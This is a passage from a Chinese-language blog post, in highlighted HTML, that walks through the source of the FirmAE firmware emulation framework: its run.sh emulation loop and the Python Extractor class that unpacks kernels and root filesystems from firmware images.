../firmae.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmae.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>然后就是检车是否为ROOT下运行，之后通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$&#123;FIRMWARE&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    run_emulation <span class="variable">$&#123;FIRMWARE&#125;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    FIRMWARES=`find <span class="variable">$&#123;3&#125;</span> -<span class="built_in">type</span> f`</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> FIRMWARE <span class="keyword">in</span> <span class="variable">$&#123;FIRMWARES&#125;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> [ ! -d <span class="variable">$&#123;FIRMWARE&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">            run_emulation <span class="variable">$&#123;FIRMWARE&#125;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断是运行文件夹内的所有固件还是单个固件</p><p>然后就是开始运行run.sh中最重要的<code>run_emulation</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] <span class="variable">$&#123;1&#125;</span> emulation start!!!&quot;</span></span><br><span class="line">INFILE=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;BRAND&#125;</span></span><br><span class="line">BRAND=`get_brand <span class="variable">$&#123;INFILE&#125;</span> <span class="variable">$&#123;BRAND&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;BRAND&#125;</span></span><br><span class="line">FILENAME=`basename <span class="variable">$&#123;INFILE%.*&#125;</span>`</span><br><span class="line">PING_RESULT=<span class="literal">false</span></span><br><span class="line">WEB_RESULT=<span class="literal">false</span></span><br><span class="line">IP=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;BRAND&#125;</span> = <span class="string">&quot;auto&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Invalid brand <span class="variable">$&#123;INFILE&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PSQL_IP&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;FIRMAE_DOCKER-&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> ( ! ./scripts/util.py check_connection _ <span class="variable">$PSQL_IP</span> ); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] docker container failed to connect to the hosts&#x27; postgresql!&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这一段主要是获取品牌名称以及检查与<code>psql</code>的连接</p><p>然后就是利用<code>extractor.py</code>去提取内核以及文件系统，将其打包在<code>images</code>目录下，文件系统命名为<code>IID.tar.gz</code>,而内核命名为<code>IID.kernel</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># extract filesystem from firmware</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">timeout --preserve-status --signal SIGINT 300 \</span><br><span class="line">    ./sources/extractor/extractor.py -b <span class="variable">$BRAND</span> -sql <span class="variable">$PSQL_IP</span> -np -nk <span class="variable">$INFILE</span> images \</span><br><span class="line">    2&gt;&amp;1 &gt;/dev/null</span><br><span class="line"></span><br><span class="line">IID=`./scripts/util.py get_iid <span class="variable">$INFILE</span> <span class="variable">$PSQL_IP</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] extractor.py failed!&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#================================</span></span><br><span class="line"><span class="comment">#extract kernel from firmware</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">timeout --preserve-status --signal SIGINT 300 \</span><br><span class="line">    ./sources/extractor/extractor.py -b <span class="variable">$BRAND</span> -sql <span class="variable">$PSQL_IP</span> -np -nf <span class="variable">$INFILE</span> images \</span><br><span class="line">    2&gt;&amp;1 &gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="提取模块"><a href="#提取模块" class="headerlink" title="提取模块"></a>提取模块</h2><p>我们仔细分析一下这个<code>extractor</code>的行为，主要是将参数传入，然后调用<code>extract.extract()</code>函数进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Extracts filesystem and \</span></span><br><span class="line"><span class="string">        kernel from Linux-based firmware images&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;input&quot;</span>, action=<span class="string">&quot;store&quot;</span>, help=<span class="string">&quot;Input file or directory&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;output&quot;</span>, action=<span class="string">&quot;store&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, default=<span class="string">&quot;images&quot;</span>,</span><br><span class="line">                        help=<span class="string">&quot;Output directory for extracted firmware&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-sql &quot;</span>, dest=<span class="string">&quot;sql&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="literal">None</span>,</span><br><span class="line">                        help=<span class="string">&quot;Hostname of SQL server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-nf&quot;</span>, dest=<span class="string">&quot;rootfs&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable extraction of root \</span></span><br><span class="line"><span class="string">                        filesystem (may decrease extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-nk&quot;</span>, dest=<span class="string">&quot;kernel&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable extraction of kernel \</span></span><br><span class="line"><span class="string">                        (may decrease extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-np&quot;</span>, dest=<span class="string">&quot;parallel&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable parallel operation \</span></span><br><span class="line"><span class="string">                        (may increase extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-b&quot;</span>, dest=<span class="string">&quot;brand&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="literal">None</span>,</span><br><span class="line">                        help=<span class="string">&quot;Brand of the firmware image&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, dest=<span class="string">&quot;debug&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        help=<span class="string">&quot;Print debug information&quot;</span>)</span><br><span class="line">    result = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> psql_check(result.sql):</span><br><span class="line">        extract = Extractor(result.input, result.output, result.rootfs,</span><br><span class="line">                            result.kernel, result.parallel, result.sql,</span><br><span class="line">                            result.brand, result.debug)</span><br><span class="line">        extract.extract()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>extract</code>是类<code>Extractor</code>实例化的一个对象</p><p>其定义如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Extractor</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Class that extracts kernels and filesystems from firmware images, given an</span></span><br><span class="line"><span class="string">    input file or directory and output directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Directories that define the root of a UNIX filesystem, and the</span></span><br><span class="line">    <span class="comment"># appropriate threshold condition</span></span><br><span class="line">    UNIX_DIRS = [<span class="string">&quot;bin&quot;</span>, <span class="string">&quot;etc&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;mnt&quot;</span>, <span class="string">&quot;opt&quot;</span>, <span class="string">&quot;root&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;run&quot;</span>, <span class="string">&quot;sbin&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;usr&quot;</span>, <span class="string">&quot;var&quot;</span>]</span><br><span class="line">    UNIX_THRESHOLD = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Lock to prevent concurrent access to visited set. Unfortunately, must be</span></span><br><span class="line">    <span class="comment"># static because it cannot be pickled or passed as instance attribute.</span></span><br><span class="line">    visited_lock = multiprocessing.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, indir, outdir=None, rootfs=True, kernel=True,</span></span></span><br><span class="line"><span class="function"><span class="params">                 numproc=True, server=None, brand=None, debug=False</span>):</span></span><br><span class="line">        <span class="comment"># Input firmware update file or directory</span></span><br><span class="line">        self._input = os.path.abspath(indir)</span><br><span class="line">        <span class="comment"># Output firmware directory</span></span><br><span class="line">        self.output_dir = os.path.abspath(outdir) <span class="keyword">if</span> outdir <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Whether to attempt to extract kernel</span></span><br><span class="line">        self.do_kernel = kernel</span><br><span class="line">        self.kernel_done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Whether to attempt to extract root filesystem</span></span><br><span class="line">        self.do_rootfs = rootfs</span><br><span class="line">        self.rootfs_done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Brand of the firmware</span></span><br><span class="line">        self.brand = brand</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Hostname of SQL server</span></span><br><span class="line">        self.database = server</span><br><span class="line"></span><br><span class="line">        self.debug = debug</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Worker pool.</span></span><br><span class="line">        self._pool = multiprocessing.Pool() <span class="keyword">if</span> numproc <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set containing MD5 checksums of visited items</span></span><br><span class="line">        self.visited = dict()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># List containing tagged items to extract as 2-tuple: (tag [e.g. MD5],</span></span><br><span class="line">        <span class="comment"># path)</span></span><br><span class="line">        self._list = list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Eliminate attributes that should not be pickled.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self_dict = self.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&quot;_pool&quot;</span>]</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&quot;_list&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> self_dict</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们逐一解释其主要的函数</p><p><code>io_dd</code>函数，就是将<code>indir</code>文件指针移动至到文件头偏移<code>offset</code>位置然后再将其输出(通俗讲就是把input文件的前offset字节裁掉然后输出)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_dd</span>(<span class="params">indir, offset, size, outdir</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a path to a target file, extract size bytes from specified offset</span></span><br><span class="line"><span class="string">    to given output file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> size:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(indir, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> ifp:</span><br><span class="line">        <span class="keyword">with</span> open(outdir, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> ofp:</span><br><span class="line">            ifp.seek(offset, <span class="number">0</span>)</span><br><span class="line">            ofp.write(ifp.read(size))</span><br></pre></td></tr></table></figure><p><code>magic</code>函数，通过python的magic库读取文件的格式并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">indata, mime=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Performs file magic while maintaining compatibility with different</span></span><br><span class="line"><span class="string">    libraries.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> mime:</span><br><span class="line">            mymagic = magic.open(magic.MAGIC_MIME_TYPE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mymagic = magic.open(magic.MAGIC_NONE)</span><br><span class="line">        mymagic.load()</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        mymagic = magic.Magic(mime)</span><br><span class="line">        mymagic.file = mymagic.from_file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> mymagic.file(indata)</span><br><span class="line">    <span class="keyword">except</span> magic.MagicException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p><code>io_md5</code>函数，把<code>target</code>文件给哈希了返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_md5</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Performs MD5 with a block size of 64kb.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    blocksize = <span class="number">65536</span></span><br><span class="line">    hasher = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(target, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> ifp:</span><br><span class="line">        buf = ifp.read(blocksize)</span><br><span class="line">        <span class="keyword">while</span> buf:</span><br><span class="line">            hasher.update(buf)</span><br><span class="line">            buf = ifp.read(blocksize)</span><br><span class="line">        <span class="keyword">return</span> hasher.hexdigest()</span><br></pre></td></tr></table></figure><p><code>io_rm</code>函数，调用<code>shutil.rmtree</code>函数来递归的删除target目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_rm</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Attempts to recursively delete a directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    shutil.rmtree(target, ignore_errors=<span class="literal">True</span>, onerror=Extractor._io_err)</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_io_err</span>(<span class="params">function, path, excinfo</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Internal function used by &#x27;_rm&#x27; to print out errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    print((<span class="string">&quot;!! %s: Cannot delete %s!\n%s&quot;</span> % (function, path, excinfo)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_find_rootfs</code>函数，来判断提取的目录是否是linux 根目录。首先通过wile循环来递归进一个目录串，直到递归达到为一个单个目录，并且该目录下有其他的文件(不是还能继续递归进目录的那种)</p><p>然后判断目录下的子目录名是否有<code>[&quot;bin&quot;, &quot;etc&quot;, &quot;dev&quot;, &quot;home&quot;, &quot;lib&quot;, &quot;mnt&quot;, &quot;opt&quot;, &quot;root&quot;, &quot;run&quot;, &quot;sbin&quot;, &quot;tmp&quot;, &quot;usr&quot;, &quot;var&quot;]</code>这类linux根目录的目录关键词，然后包含的个数来判断是不是一个linux根目录(好直接)。如果需要递归的话则对子目录进行递归调用<code>io_find_rootfs</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_find_rootfs</span>(<span class="params">start, recurse=True</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Attempts to find a Linux root directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Recurse into single directory chains, e.g. jffs2-root/fs_1/.../</span></span><br><span class="line">    path = start</span><br><span class="line">    <span class="keyword">while</span> (len(os.listdir(path)) == <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">            os.path.isdir(os.path.join(path, os.listdir(path)[<span class="number">0</span>]))):</span><br><span class="line">        path = os.path.join(path, os.listdir(path)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># count number of unix-like directories</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> subdir <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">        <span class="keyword">if</span> subdir <span class="keyword">in</span> Extractor.UNIX_DIRS <span class="keyword">and</span> \</span><br><span class="line">            os.path.isdir(os.path.join(path, subdir)) <span class="keyword">and</span> \</span><br><span class="line">                len(os.listdir(os.path.join(path, subdir))) &gt; <span class="number">0</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check for extracted filesystem, otherwise update queue</span></span><br><span class="line">    <span class="keyword">if</span> count &gt;= Extractor.UNIX_THRESHOLD:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in some cases, multiple filesystems may be extracted, so recurse to</span></span><br><span class="line">    <span class="comment"># find best one</span></span><br><span class="line">    <span class="keyword">if</span> recurse:</span><br><span class="line">        <span class="keyword">for</span> subdir <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(os.path.join(path, subdir)):</span><br><span class="line">                res = Extractor.io_find_rootfs(os.path.join(path, subdir),</span><br><span class="line">                                                <span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">if</span> res[<span class="number">0</span>]:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">False</span>, start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extract</code>函数，这里就对单个input函数而不是整个目录进行说明。把需要提取的item放进_list中，然后对_list中所有item调用<code>\_extract\_item</code>进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Perform extraction of firmware updates from input to tarballs in output</span></span><br><span class="line"><span class="string">    directory using a thread pool.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(self._input):</span><br><span class="line">        <span class="keyword">for</span> path, _, files <span class="keyword">in</span> os.walk(self._input):</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> files:</span><br><span class="line">                self._list.append(os.path.join(path, item))</span><br><span class="line">    <span class="keyword">elif</span> os.path.isfile(self._input):</span><br><span class="line">        self._list.append(self._input)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.output_dir <span class="keyword">and</span> <span class="keyword">not</span> os.path.isdir(self.output_dir):</span><br><span class="line">        os.makedirs(self.output_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self._pool:</span><br><span class="line">        <span class="comment"># since we have to handle multiple files in one firmware image, it</span></span><br><span class="line">        <span class="comment"># is better to use chunk_size=1</span></span><br><span class="line">        chunk_size = <span class="number">1</span></span><br><span class="line">        list(self._pool.imap_unordered(self._extract_item, self._list,</span><br><span class="line">                                        chunk_size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> self._list:</span><br><span class="line">            self._extract_item(item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_extract_item</span>(<span class="params">self, path</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Wrapper function that creates an ExtractionItem and calls the extract()</span></span><br><span class="line"><span class="string">    method.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ExtractionItem(self, path, <span class="number">0</span>, <span class="literal">None</span>, self.debug).extract()</span><br></pre></td></tr></table></figure><p>嗯，看来关键类是<code>ExtractionItem</code>,我们再来分析一下这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 